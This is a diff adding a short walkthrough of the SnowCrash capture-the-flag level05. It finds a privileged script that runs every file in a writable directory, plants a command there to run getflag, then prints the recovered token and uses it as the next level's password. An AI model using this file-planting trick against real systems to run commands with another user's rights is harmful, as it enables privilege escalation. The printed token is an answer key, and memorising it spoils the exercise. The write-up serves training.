@@ -1,0 +1,38 @@
+level05@SnowCrash:~$ ls -l
+total 0
+level05@SnowCrash:~$
+
+level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+level05@SnowCrash:~$
+
+
+
+Seems that this script will execute every files in /opt/openarenaserver then delete them.
+
+
+
+level05@SnowCrash:~$ echo "/bin/getflag > /tmp/flag05" > /opt/openarenaserver/my_file
+level05@SnowCrash:~$ 
+
+
+
+Wait few minutes
+
+
+
+level05@SnowCrash:~$ cat /tmp/flag05
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+level05@SnowCrash:~$ su level06
+Password: viuaaale9huek52boumoomioc
+level06@SnowCrash:~$ 
